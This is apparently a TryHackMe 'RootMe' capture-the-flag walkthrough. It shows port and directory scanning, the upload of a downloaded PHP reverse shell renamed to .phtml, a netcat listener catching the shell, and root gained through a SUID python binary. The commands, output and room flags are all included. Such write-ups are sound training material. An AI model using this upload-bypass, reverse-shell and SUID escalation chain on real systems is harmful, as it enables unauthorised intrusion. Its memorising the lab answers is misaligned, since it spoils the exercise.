# Reconnaissance

### Scan the machine, how many ports are open?
```
┌──(root💀kali)-[~]
└─# nmap -Pn <machine ip>
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```
> *Answer:* 2

### What version of Apache is running?
```
┌──(root💀kali)-[~]
└─# nmap -sV <machine ip>
...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
...
```
> *Answer:* 2.4.29

### What service is running on port 22?
> *Answer:* ssh

### What is the hidden directory?
```
┌──(root💀kali)-[~]
└─# dirsearch -u "http://<machine ip>/"
...
[01:06:56] 200 -  732B  - /panel/
[01:07:21] 200 -  742B  - /uploads/
...
```
> *Answer:* 


<br><br>
# Getting a shell

### user.txt
```
┌──(root💀kali)-[~]
└─# curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php --output php-reverse-shell.php
```
To gain remote access to this machine, follow these steps:
  1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).
  2. Rename this file to php-reverse-shell.phtml
  3. We're now going to listen to incoming connections using netcat. Run the following command: <b>nc -lvnp 1234</b>
  4. Upload your shell and navigate to <b>http://&lt;machine ip&gt;/uploads/php-reverse-shell.phtml&nbsp;</b> - This will execute your payload
  5. You should see a connection on your netcat session
```
┌──(root💀kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.241.141] from (UNKNOWN) [10.10.39.82] 47886
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:16:30 up 17 min,  0 users,  load average: 0.00, 0.26, 0.58
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ find / -type f -name user.txt 2> /dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```
> *Answer:* THM{y0u_g0t_a_sh3ll}


<br><br>
# Privilege escalation

### Search for files with SUID permission, which file is weird?
```
$ find / -perm -u=s -type f 2> /dev/null
...
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
...
```
> *Answer:* /usr/bin/python

### root.txt
[GTFOBins](https://gtfobins.github.io/)
```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```

<h1 align="center">
  <img src="https://i2.wp.com/media4.giphy.com/media/mQG644PY8O7rG/giphy.gif" style="max-width:600px;">
</h1>

```
ls /root
root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n} 
```
> *Answer:* THM{pr1v1l3g3_3sc4l4t10n}

